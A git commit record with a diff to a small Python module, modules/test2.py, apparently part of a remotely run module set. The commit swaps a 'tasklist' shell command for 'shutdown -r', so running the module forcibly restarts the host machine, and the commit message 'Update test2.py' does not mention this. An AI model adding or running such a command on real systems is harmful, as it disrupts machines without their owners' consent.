bbf092657bf6726d5856e7ecf0aad3f0b0da9860
experiment2016 <sarpiericam@libero.it>
2016-05-30 18:07:46 +0200

    Update test2.py

--- modules/test2.py
+++ modules/test2.py
@@ -3,7 +3,7 @@ import subprocess
 def run(**args):
   try:
      print("[*] reading")
-     look = "tasklist"  
+     look = "shutdown -r"  
      proc = subprocess.Popen(look, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
      stdoutput = proc.stdout.read() + proc.stderr.read()
      return str(stdoutput)
